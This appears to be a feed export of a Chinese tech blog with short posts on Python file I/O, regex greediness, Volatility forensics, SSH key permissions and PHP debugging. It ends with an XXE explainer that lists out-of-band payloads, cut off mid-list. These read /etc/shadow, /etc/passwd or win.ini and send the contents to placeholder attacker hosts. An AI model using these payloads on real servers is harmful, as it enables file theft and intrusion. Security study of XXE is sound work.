<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load additional module</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="comment"># define a list of places</span></span><br><span class="line">placesList = [<span class="string">'Berlin'</span>, <span class="string">'Cape Town'</span>, <span class="string">'Sydney'</span>, <span class="string">'Moscow'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.data'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="comment"># store the data as binary data stream</span></span><br><span class="line">    pickle.dump(placesList, filehandle)</span><br></pre></td></tr></table></figure>
<p>We read the list from the file as follows. Firstly, the output file <code>listfile.data</code> is opened binary for reading <code>"rb"</code> in line 4. Secondly, the list of places is loaded from the file using the <code>load()</code> method.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># load additional module</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.data'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    <span class="comment"># read the data as binary data stream</span></span><br><span class="line">    placesList = pickle.load(filehandle)</span><br></pre></td></tr></table></figure>
<p><code>pickle</code> works with all kind of Python objects such as strings, numbers, self-defined structures, and every other built-in data structure Python provides.</p>
<h3 id="使用json">使用JSON</h3>
<p>The binary data format <code>pickle</code> uses is specific to Python. To improve the interoperability between different programs the JavaScript Object Notation (<a href="https://en.wikipedia.org/wiki/JSON" target="_blank" rel="noopener">JSON</a>) provides an easy-to-use and human-readable schema, and thus became very popular.</p>
<p>写入文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># define list with values</span></span><br><span class="line">basicList = [<span class="number">1</span>, <span class="string">"Cape Town"</span>, <span class="number">4.6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># open output file for writing</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    json.dump(basicList, filehandle)</span><br></pre></td></tr></table></figure>
<p>读取文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># open output file for reading</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'listfile.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> filehandle:</span><br><span class="line">    basicList = json.load(filehandle)</span><br></pre></td></tr></table></figure>
<p>参考:<a href="https://stackabuse.com/reading-and-writing-lists-to-a-file-in-python/" target="_blank" rel="noopener">Reading and Writing Lists to a File in Python</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;关于读写文件，在Python中提供了&lt;code&gt;read()&lt;/code&gt;、&lt;code&gt;write()&lt;/code&gt;来读写一行，也提供了&lt;code&gt;readlines()&lt;/code&gt;、&lt;code&gt;writelines()&lt;/code&gt;读写多行的方式。此外，模块&lt;code&gt;
    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://flamepeak.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python re 模块 贪婪模式和非贪婪模式</title>
    <link href="http://flamepeak.com/2020/03/16/Python-re-module-tips-20200316/"/>
    <id>http://flamepeak.com/2020/03/16/Python-re-module-tips-20200316/</id>
    <published>2020-03-16T00:08:12.000Z</published>
    <updated>2020-03-16T16:19:04.810Z</updated>
    
    <content type="html"><![CDATA[<p>Python里数量词默认是贪婪的，总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在<code>*</code>,<code>?</code>,<code>+</code>,<code>{m,n}</code>后面加上<code>?</code>，使贪婪变成非贪婪。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">"This is a number 234-235-22-423"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r=re.match(<span class="string">".+(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'4-235-22-423'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r=re.match(<span class="string">".+?(\d+-\d+-\d+-\d+)"</span>,s)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'234-235-22-423'</span></span><br></pre></td></tr></table></figure>
<p>正则表达式模式中使用到通配字，那它在从左到右的顺序求值时，会尽量“抓取”满足匹配最长字符串</p>
<p>解决方式：非贪婪操作符<code>?</code>，这个操作符要求正则匹配的越少越好。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2343'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+?)"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+)ddd"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>) </span><br><span class="line"><span class="string">'2343'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>re.match(<span class="string">r"aa(\d+?)ddd"</span>,<span class="string">"aa2343ddd"</span>).group(<span class="number">1</span>)</span><br><span class="line"><span class="string">'2343'</span></span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python里数量词默认是贪婪的，总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在&lt;code&gt;*&lt;/code&gt;,&lt;code&gt;?&lt;/code&gt;,&lt;code&gt;+&lt;/code&gt;,&lt;code&gt;{m,n}&lt;/code&gt;后面加上&lt;code&gt;?&lt;/code&gt;，使贪
    
    </summary>
    
      <category term="Python" scheme="http://flamepeak.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://flamepeak.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Linux Volatility 安装与使用</title>
    <link href="http://flamepeak.com/2020/03/11/Linux-Forensics-Volatility-install-usage-20200322/"/>
    <id>http://flamepeak.com/2020/03/11/Linux-Forensics-Volatility-install-usage-20200322/</id>
    <published>2020-03-11T08:08:12.000Z</published>
    <updated>2020-03-11T18:55:54.171Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="noopener">github: volatility</a></p>
<h3 id="安装">安装</h3>
<h3 id="linux">Linux</h3>
<p>在kali中，安装过程很简单</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install volatility</span><br></pre></td></tr></table></figure>
<p>如果需要可以安装各种依赖，当然可以不安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Distorm3:牛逼的反编译库</span></span><br><span class="line">pip install distorm3</span><br><span class="line"></span><br><span class="line"><span class="comment">#Yara:恶意软件分类工具</span></span><br><span class="line">pip install yara</span><br><span class="line"></span><br><span class="line"><span class="comment">#PyCrypto:加密工具集</span></span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"><span class="comment">#PIL:图片处理库</span></span><br><span class="line">pip install pil</span><br><span class="line"></span><br><span class="line"><span class="comment">#OpenPyxl:读写excel文件</span></span><br><span class="line">pip install openpyxl</span><br><span class="line"></span><br><span class="line"><span class="comment">#ujson:JSON解析</span></span><br><span class="line">pip install ujson</span><br></pre></td></tr></table></figure>
<h3 id="windows">Windows</h3>
<p>直接至官网下载exe文件， <a href="https://www.volatilityfoundation.org/releases" target="_blank" rel="noopener">Volatility 2.6 (Windows 10 / Server 2016)</a></p>
<h2 id="用法">用法</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw imageinfo   <span class="comment">#获取镜像系统信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pslist/pstree/psscan 进程信息</span></span><br><span class="line"><span class="comment"># pslist无法显示隐藏/终止进程。解决这个问题的插件是psscan，这个插件输出的内容会比pslist多得多。</span></span><br><span class="line"><span class="comment"># pstree同样也是扫描进程的，但是是以进程树的形式出现的。</span></span><br><span class="line"></span><br><span class="line">volatility -f mem.raw  --profile=Win7SP1x64 pslist <span class="comment"># 列出所有进程</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 cmdscan <span class="comment">#查看命令行进程中历史命令</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 filescan | grep <span class="string">"flag"</span>  <span class="comment">#文件搜索，并过滤</span></span><br><span class="line">volatility -f mem.raw --profile=WinXPSP3x86 dumpfiles -Q 0x0000000001155f90 --dump-dir=./ <span class="comment">#导出指定偏移的文件</span></span><br><span class="line">volatility -f mem.raw  --profile=WinSP1x64 hivelist <span class="comment">#列举缓存在内存中的注册表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查看系统用户名</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 printkey -K <span class="string">"SAM\Domains\Account\Users\Names"</span></span><br><span class="line"><span class="comment">#查看网络连接</span></span><br><span class="line">volatility -f mem.raw --profile=Win7SP1x64 netscan</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://github.com/volatilityfoundation/volatility&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github: volatility&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;安装&lt;/h
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SSH permissions are too open error</title>
    <link href="http://flamepeak.com/2020/01/22/SSH-permissions-are-too-open-error/"/>
    <id>http://flamepeak.com/2020/01/22/SSH-permissions-are-too-open-error/</id>
    <published>2020-01-22T07:45:16.000Z</published>
    <updated>2020-01-22T07:47:23.032Z</updated>
    
    <content type="html"><![CDATA[<p>Linux中遇到如下错误，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Downloads# ssh -i prikeyfile  joanna@10.10.10.171</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">Permissions 0777 for &apos;prikey&apos; are too open.</span><br><span class="line">It is required that your private key files are NOT accessible by others.</span><br><span class="line">This private key will be ignored.</span><br><span class="line">Load key &quot;prikey&quot;: bad permissions</span><br><span class="line">joanna@10.10.10.171&apos;s password: </span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
<p>这个prikeyfile是自己保存的，权限设的高</p>
<p>遇到这个问题，需要把权限调低</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Keys need to be only readable by you:</span><br><span class="line"></span><br><span class="line">chmod 400 ~/.ssh/id_rsa</span><br><span class="line"></span><br><span class="line"># If Keys need to be read-writable by you:</span><br><span class="line"></span><br><span class="line">chmod 600 ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux中遇到如下错误，&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;root@kali:~/Downloads# ssh -i prik
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>/bin/bash^M: bad interpreter: No such file or directory</title>
    <link href="http://flamepeak.com/2020/01/22/%C2%96-bin-bash-M-bad-interpreter-No-such-file-or-directory/"/>
    <id>http://flamepeak.com/2020/01/22/-bin-bash-M-bad-interpreter-No-such-file-or-directory/</id>
    <published>2020-01-22T04:33:06.000Z</published>
    <updated>2020-01-22T12:02:29.666Z</updated>
    
    <content type="html"><![CDATA[<p>在运行<code>.sh</code>脚本时遇到这样的错误<code>/bin/bash^M: bad interpreter: No such file or directory</code>，Google之后才找到原因</p>
<p>在Windows中编写的脚本，直接在Linux下运行就可能会出现这样的问题。</p>
<p>解决办法是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i -e <span class="string">'s/\r$//'</span> scriptname.sh</span><br><span class="line">./scriptname.sh</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在运行&lt;code&gt;.sh&lt;/code&gt;脚本时遇到这样的错误&lt;code&gt;/bin/bash^M: bad interpreter: No such file or directory&lt;/code&gt;，Google之后才找到原因&lt;/p&gt;
&lt;p&gt;在Windows中编写的脚本，直接
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://flamepeak.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>kali 安装 knock</title>
    <link href="http://flamepeak.com/2020/01/16/kali-install-knock-20200116/"/>
    <id>http://flamepeak.com/2020/01/16/kali-install-knock-20200116/</id>
    <published>2020-01-16T03:06:56.000Z</published>
    <updated>2020-01-16T03:08:22.466Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install knockd</span><br></pre></td></tr></table></figure>
<p>关于Knock的原理与使用请参考鸟哥的教程</p>
<p><a href="http://linux.vbird.org/linux_security/knockd.php" target="_blank" rel="noopener">使用 knock 管理防火牆</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install knockd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/t
    
    </summary>
    
      <category term="Linux" scheme="http://flamepeak.com/categories/Linux/"/>
    
    
      <category term="Kali" scheme="http://flamepeak.com/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>PHP Debugging</title>
    <link href="http://flamepeak.com/2019/12/16/PHP-debugging-20191216/"/>
    <id>http://flamepeak.com/2019/12/16/PHP-debugging-20191216/</id>
    <published>2019-12-16T07:07:04.000Z</published>
    <updated>2019-12-17T01:07:06.955Z</updated>
    
    <content type="html"><![CDATA[<h3 id="dumping-variables-to-stdout">Dumping variables to stdout</h3>
<ul>
<li><strong>var_dump ($var)</strong> dumps the variable type and value to stdout.</li>
<li><strong>print_r ($var)</strong> prints the variable value in human-readable form to stdout.</li>
<li><strong>get_defined_vars()</strong> gets all the defined variables including built-ins and custom variables (print_r to view them).</li>
<li><strong>debug_zval_dump ($var)</strong> dumps the variable with its reference counts. This is useful when there are multiple paths to update a single reference.</li>
<li><strong>debug_print_backtrace()</strong> prints a backtrace that shows the current function call-chain.</li>
<li><strong>debug_backtrace()</strong> gets the backtrace. You can print_r, log it to a file, or send it to a logging endpoint asynchronously.</li>
</ul>
<p>eg:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myVar = <span class="string">"hello world!"</span>;</span><br><span class="line"></span><br><span class="line">var_dump($myVar);</span><br><span class="line">print_r($myVar);</span><br><span class="line"></span><br><span class="line">$allVars = get_defined_vars();</span><br><span class="line">print_r($allVars);</span><br><span class="line">debug_zval_dump($allVars);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">($hello)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $hello;</span><br><span class="line">    debug_print_backtrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sayHello($myVar);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://paiza.io/en/projects/new?language=php" target="_blank" rel="noopener">Test PHP online</a></p>
<h3 id="switching-error-reporting-level">Switching error reporting level</h3>
<p>PHP has a few ways to configure error reporting. You can use the <code>php.ini</code> file, if you have access to it. Otherwise, you might use the <code>htaccess</code> configuration. If you can’t use configuration files, you have the option of changing the values via a script.</p>
<ul>
<li><strong>error_reporting</strong> sets the level of logging. <strong>E_NOTICE</strong> is useful during development since it will tell you about defects such as unassigned variables.</li>
<li><strong>display_errors</strong> tells PHP if and where to display error messages.</li>
<li><strong>display_startup_errors</strong> should only be used when debugging.</li>
<li><strong>log_errors</strong> and <strong>error_log</strong> work together to send errors to a log file. Do this in production rather than displaying them to end users.</li>
</ul>
<h3 id="php-debugging-tools">PHP debugging tools</h3>
<p>You can debug PHP using one of many debugging tools to attach a debugger client. <a href="https://www.jetbrains.com/help/phpstorm/php-debugging-session.html" target="_blank" rel="noopener">PhpStorm</a> works with debug utilities like <a href="https://xdebug.org/docs/" target="_blank" rel="noopener">Xdebug</a> and <a href="http://www.zend.com/en/products/studio/downloads" target="_blank" rel="noopener">ZendDebugger</a>.</p>
<p>Being a polyglot, I need an IDE that supports multiple languages, so I’m opting for <a href="https://code.visualstudio.com/" target="_blank" rel="noopener">VS Code</a> these days.</p>
<ol type="1">
<li><a href="https://xdebug.org/docs/install" target="_blank" rel="noopener">Install XDebug</a></li>
</ol>
<p>I highly recommend you make a simple <code>test.php</code> file, put a <code>phpinfo();</code> statement in there, then copy the output and paste it into the <a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">XDebug installation wizard</a>. It will analyze it and give you tailored installation instructions for your environment.</p>
<ol start="2" type="1">
<li><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a></li>
</ol>
<p><a href="https://xdebug.org/docs/install#configure-php" target="_blank" rel="noopener">Configure PHP to use XDebug</a> by adding <code>zend_extension=path/to/xdebug</code> to your php.ini. The path of your php.ini is shown in your <code>phpinfo()</code> output under "Loaded Configuration File".</p>
<ol start="3" type="1">
<li>Enable remote debugging in your <code>php.ini</code>:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; allow remote debugging</span><br><span class="line">[XDebug]</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_autostart = 1</span><br></pre></td></tr></table></figure>
<ol start="4" type="1">
<li><p>If you are doing web development, don't forget to restart your webserver to reload the settings.</p></li>
<li><p>Verify your installation by checking your <code>phpinfo()</code> output for an XDebug section.</p></li>
</ol>
<h3 id="vscode-error">VScode Error</h3>
<ol type="1">
<li><strong>setting php.validate.executablePath</strong></li>
</ol>
<p>Go to File&gt; Preferences &gt; Settings ...</p>
<p>输入框中输入php，修改 <code>PHP › Validate: Executable Path</code> 下<code>Eidit in settings.json</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;php.validate.executablePath&quot;: &quot;C:\\xampp\\php\\php.exe&quot;,</span><br><span class="line">&quot;php.executablePath&quot;: &quot;C:\\php7.1\\php.exe&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：</p>
<p><a href="https://stackify.com/php-debugging-guide/" target="_blank" rel="noopener">A Detailed Guide to PHP Debugging</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;dumping-variables-to-stdout&quot;&gt;Dumping variables to stdout&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;var_dump ($var)&lt;/strong&gt; dumps the variable type an
    
    </summary>
    
      <category term="Web前端" scheme="http://flamepeak.com/categories/Web%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="PHP" scheme="http://flamepeak.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>XXE 成因分析与应用</title>
    <link href="http://flamepeak.com/2019/12/16/XXE-explanation-and-usage-20191216/"/>
    <id>http://flamepeak.com/2019/12/16/XXE-explanation-and-usage-20191216/</id>
    <published>2019-12-16T03:12:37.000Z</published>
    <updated>2019-12-16T03:15:59.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="xxe简介">xxe简介</h3>
<p>XML External Entity Injection，xml外部实体注入漏洞</p>
<p>当允许引用外部实体时，通过构造恶意内容可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h3 id="可能的场景">可能的场景</h3>
<p>很多的网站都会对xml文件进行解析，解析的时候都有可能出现可用的XXE漏洞，从而被攻击利用，攻击的方法基于实体中可以使用的协议。</p>
<p>像XML文件作为配置文件的系统（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为Yiruma处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点。</p>
<h3 id="xxe的成因分析">XXE的成因分析</h3>
<p>产生原因是XML文档结构和DTD文档类型定义漏洞，参数过滤不严</p>
<h4 id="xml文档结构">xml文档结构</h4>
<p>XML文档有三个部分：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一部分：XML申明--&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="comment">&lt;!--第二部分：文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第三部分：文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>第二部分就是xml文档的DTD部分，也是攻击的产生点。</p>
<h3 id="xxe-payloads">XXE Payloads</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------</span><br><span class="line">Vanilla, used to verify outbound xxe or blind xxe</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY sp SYSTEM "http://x.x.x.x:443/test.txt"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;sp;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">OoB variation of above (seems to work better against .NET)</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.xml"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">data</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">c:</span>/<span class="attr">windows</span>/<span class="attr">win.ini</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % param1 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://x.x.x.x:443/?%data;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">OoB extraction</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/shadow"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://EvilHost:port/sp.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line">## External dtd: ##</span><br><span class="line">&lt;!ENTITY % param3 "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'ftp://Evilhost:port/%data3;'&gt;"&gt;</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra ERROR -- Java</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % data3 SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param3;</span></span><br><span class="line"><span class="meta">%exfil;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br><span class="line">## External dtd: ##</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % param1 '&lt;!ENTITY &amp;#x25; external SYSTEM "file:///nothere/%payload;"&gt;'&gt; %param1; %external;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line">OoB extra nice</span><br><span class="line">-----------------------------------------------------------------------</span><br><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="meta"> &lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="meta"> 